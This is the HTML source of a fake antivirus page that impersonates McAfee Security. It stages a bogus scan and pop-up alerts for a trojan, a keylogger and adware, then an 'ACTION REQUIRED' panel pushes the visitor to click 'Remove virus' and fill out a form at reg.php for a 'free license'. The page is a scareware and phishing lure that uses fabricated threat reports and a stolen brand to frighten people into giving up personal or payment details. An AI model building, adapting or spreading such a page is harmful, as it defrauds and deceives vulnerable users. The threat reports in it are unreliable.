
<!doctype html>
<html lang="en">
<head>
  <script>var clicky_site_ids = clicky_site_ids || []; clicky_site_ids.push(101316388);</script>
<script async src="http://static.getclicky.com/js"></script>

    <meta charset="utf-8">
    <title>How security works</title>
    <meta name="robots" content="noindex">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="stylesheet" href="css/lity.css">
    <link href="css/style.css" type="text/css" rel="stylesheet">

</head>

<body style="background-color:black;">

    <audio id="sound" preload="auto">
        <source src="media/beep.mp3" type="audio/mp3">
    </audio>

    <div id="win-1">
        <div id="win-1_header">
            <img src="images/ico_header.png" class="ico">
            <div class="name">McAfee Security</div>
            <img src="images/win_min.png" class="win_min">
            <img src="images/win_cls.png" class="win_cls">
        </div>

        <div id="win-1-gray-line">
            <img src="images/ico_gray1.png" class="ico_gray1">
            <div class="set">The settings</div>
            <img src="images/ico_gray2.png" class="ico_gray2">
            <div class="help">Help</div>
        </div>

        <div id="win-1-white-line">
            <img src="images/pc_green.gif" class="pc">
            <div class="txt-1">You are protected</div>
            <div class="txt-2">
                Protection updates: <span style="color: #23a31c;">Current</span><br />
                Last scan: <span style="color: #c00;">Not available</span> <span style="color: #2ea8e5;">| Quick Scan</span><br />
                Licenses used: <span style="color: #23a31c;">1 of 5</span> <span style="color: #2ea8e5;">| Install on another device</span>
            </div>
        </div>

        <div id="win-1-green-line">
            <img src="images/corner.gif" class="corner">
        </div>

        <div id="win-1-bl1">
            <div class="txt-1">Security</div>
            <img src="images/ico_bl1.gif" class="ico">
            <div class="txt-2">Protected</div>
            <div class="line"></div>
        </div>

        <div id="win-1-bl2">
            <div class="txt-1">Identity</div>
            <img src="images/ico_bl2.gif" class="ico">
            <div class="txt-2">Protected</div>
            <div class="line"></div>
        </div>

        <div id="win-1-bl3">
            <div class="txt-1">Performance</div>
            <img src="images/ico_bl3.gif" class="ico">
            <div class="txt-2">Protected</div>
            <div class="line"></div>
        </div>

        <div id="win-1-bl4">
            <div class="txt-1">More McAfee</div>
            <img src="images/ico_bl4.gif" class="ico">
            <div class="txt-2">Protected</div>
        </div>

        <div id="win-1-gray-line-2">
            <div class="txt">ABO-STATUS: <span class="gr">30 days to go</span></div>
        </div>
    </div>

    <div id="win-2" style="display: none;">
        <div id="win-2-header">
            <div class="name">Fast scan</div>
            <img src="images/win_min.png" class="win_min">
            <img src="images/win_cls.png" class="win_cls">
        </div>

        <div id="win-2-line-orange">
            <img src="images/ring.gif" class="ring">
            <div class="header">Work</div>
            <div class="txt-1">
Scan Commonly Infected Areas and Startup Files ...</div>
            <div class="txt-2" id="path-1">C:\Users\John\AppData\Local\Microsoft</div>
        </div>

        <div id="win-2-line-red" style="display:none;">
            <img src="images/cross.gif" class="ring">
            <div class="header" id="work">Work</div>
            <div class="txt-1" id="txt-1">
Scan Commonly Infected Areas and Startup Files ...</div>
            <div class="txt-2" id="path-2">C:\Program Files\Windows Defender\MSASCuiL.exe</div>
        </div>

        <div id="win-2-tab">
            <div class="line-1">summary of results</div>
            <div class="line-2">[+] Total number of items scanned:</div>
            <div class="line-3">[+] Overall security risks identified:</div>
            <div class="line-4">[+] Total security risks resolved:</div>
            <div class="line-5">Overall security risks require attention:</div>
            <div class="line-6"></div>
            <div class="digit-1" id="cnt-1">0</div>
            <div class="digit-2" id="cnt-2">0</div>
            <div class="digit-3">0</div>
            <div class="digit-4" id="cnt-4">0</div>
        </div>

        <img src="images/mcafee.png" class="nrt_logo">
        <div class="btn-1">Pause</div>
        <div class="btn-2">Halt</div>
    </div>

    <div id="win-3" style="display: none;">
        <div id="win-3-header">
            <img src="images/ico_header.png" class="ico">
            <div class="name">McAfee Security</div>
            <img src="images/win_min.png" class="win_min">
            <img src="images/win_cls.png" class="win_cls">
        </div>

        <div id="win-3-red-line">Your device can be vulnerable</div>

        <div id="win-3-text">
            
            ACTION REQUIRED! <br /><br />
            It is recommended to register and activate antivirus. <br /><br />
            Click "Remove Virus" and fill out the form for a free 1 year license.<br /><br />
            and follow the instructions afterwards to activate.
            <!--Click "Remove Virus" to Activate and Register antivirus. -->
        </div>

        <a href="reg.php">
            <div id="win-3_btn">Remove virus</div>
        </a>




    </div>

    <div id="vir-1">
        <div id="vir-tray">
            <div class="line-red"><b>Threat detected!</b><br />win-32/Hoax.Renos.HX</div>
            <img src="images/ico_tray1.gif" class="ico_tray1">
            <div class="txt-1">High risk</div>
            <img src="images/ico_tray2.gif" class="ico_tray2">
            <div class="txt-2"><b>Origin</b><br />Not available</div>
            <img src="images/ico_tray3.gif" class="ico_tray3">
            <div class="txt-3"><b>Activity</b><br />Threat actions taken: 1</div>
        </div>
    </div>

    <div id="vir2">
        <div id="vir-tray">
            <div class="line-red"><b>Threat detected!</b><br >/Trojan IRC / Backdor.Sd.FRV</div>
            <img src="images/ico_tray1.gif" class="ico_tray1">
            <div class="txt-1">High risk</div>
            <img src="images/ico_tray2.gif" class="ico_tray2">
            <div class="txt-2"><b>Origin</b><br />Not available</div>
            <img src="images/ico_tray3.gif" class="ico_tray3">
            <div class="txt-3"><b>Activity</b><br />Threat Actions Taken: 1</div>
        </div>
    </div>

    <div id="vir3">
        <div id="vir-tray">
            <div class="line-red"><b>Threat detected!</b><br />Adware.win-32.Look2me.ab</div>
            <img src="images/ico_tray1.gif" class="ico_tray1">
            <div class="txt-1">Medium risk</div>
            <img src="images/ico_tray2.gif" class="ico_tray2">
            <div class="txt-2"><b>Origin</b><br />Not available</div>
            <img src="images/ico_tray3.gif" class="ico_tray3">
            <div class="txt-3"><b>Activity</b><br />Threat Actions Taken: 1</div>
        </div>
    </div>

    <div id="vir4">
        <div id="vir-tray">
            <div class="line-red"><b>Threat detected!</b><br />Trojan.Qoologic - Key Logger</div>
            <img src="images/ico_tray1.gif" class="ico_tray1">
            <div class="txt-1">High risk</div>
            <img src="images/ico_tray2.gif" class="ico_tray2">
            <div class="txt-2"><b>Origin</b><br />Not available</div>
            <img src="images/ico_tray3.gif" class="ico_tray3">
            <div class="txt-3"><b>Activity</b><br />Bedrohungsaktionen ausgeführt: 1</div>
        </div>
    </div>

    <div id="vir-5">
        <div id="vir-tray">
            <div class="line-red"><b>Threat detected!</b><br />Trojan.Fakealert.356</div>
            <img src="images/ico_tray1.gif" class="ico_tray1">
            <div class="txt-1">High risk</div>
            <img src="images/ico_tray2.gif" class="ico_tray2">
            <div class="txt-2"><b>Origin</b><br />Not available</div>
            <img src="images/ico_tray3.gif" class="ico_tray3">
            <div class="txt-3"><b>Activity</b><br />Activity: 1</div>
        </div>
    </div>

    <script src="js/jquery-1.11.0.min.js"></script>
    <script src="js/lity.js"></script>
    <script src="js/script.js"></script>
</body>
</html>
